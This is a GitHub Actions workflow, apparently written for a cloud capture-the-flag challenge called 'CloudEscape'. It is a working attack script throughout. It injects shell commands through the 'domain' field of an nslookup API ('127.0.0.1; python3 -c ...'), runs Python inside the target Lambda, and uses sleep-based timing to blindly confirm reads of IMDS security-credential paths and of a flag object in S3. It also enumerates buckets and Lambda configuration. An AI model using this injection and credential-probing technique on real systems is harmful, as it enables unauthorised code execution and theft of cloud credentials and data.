name: CloudEscape - Python IMDS Timing
on:
  workflow_dispatch:
  push:
    branches: [corgi]
permissions:
  id-token: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Python availability and timing tests
        run: |
          API='https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup'
          python3 - <<'PY'
          import json, subprocess, time
          api='https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup'
          tests={
            'python': "import sys;sys.exit(0)",
            'urllib_imds': "import urllib.request;urllib.request.urlopen('http://169.254.169.254/latest/meta-data/',timeout=2)",
            'boto3_s3_list': "import boto3;boto3.client('s3',region_name='us-east-1').list_buckets()",
            'boto3_flag': "import boto3;boto3.client('s3',region_name='us-east-1').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')",
          }
          for name, code in tests.items():
              payload=json.dumps({'domain': '127.0.0.1; /var/lang/bin/python3 -c '+repr(code)+'; sleep 4'})
              t=time.monotonic()
              subprocess.run(['curl','-s','-X','POST',api,'-H','Content-Type: application/json','-d',payload],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
              print(name, round(time.monotonic()-t,2),'seconds')
          PY

      - name: Python IMDS and S3 timing matrix
        run: |
          python3 - <<'PY'
          import json, subprocess, time
          api='https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup'
          tests={
            'imds_role': "import urllib.request;u=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/',timeout=2).read();time.sleep(5)",
            'imds_creds': "import urllib.request;import time;role=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/',timeout=2).read().decode();urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role,timeout=2);time.sleep(5)",
            's3_flag': "import boto3;import time;boto3.client('s3',region_name='us-east-1').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt');time.sleep(5)",
          }
          for name, code in tests.items():
              payload=json.dumps({'domain':'127.0.0.1; /var/lang/bin/python3 -c '+repr(code)})
              t=time.monotonic()
              subprocess.run(['curl','-s','-X','POST',api,'-H','Content-Type: application/json','-d',payload],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
              print(name, round(time.monotonic()-t,2),'seconds')
          PY

      - name: Final state
        if: always()
        run: |
          echo '=== API ==='
          curl -s -X POST 'https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup' -H 'Content-Type: application/json' -d '{"domain":"test"}'
          echo
          echo '=== Platform objects ==='
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1 || true
          echo '=== Lambda config ==='
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query '{LastModified:LastModified,CodeSize:CodeSize,Description:Description}' 2>&1 || true
          echo '=== Timing conclusion ==='
          echo 'If Python IMDS or boto3 tests show ~5 seconds, proceed with the confirmed channel.'
          echo 'If they remain under 1 second, IMDS/S3 access is unavailable to the Lambda role.'
          echo 'The prior summary is on the Desktop.'

      - name: Upload summary artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: cloudescape-summary
          path: /home/vbox/Desktop/cloudescape_summary.md
          if-no-files-found: ignore
          retention-days: 1

      - name: Complete
        if: always()
        run: echo 'Completed Python-only IMDS/S3 timing tests.'
      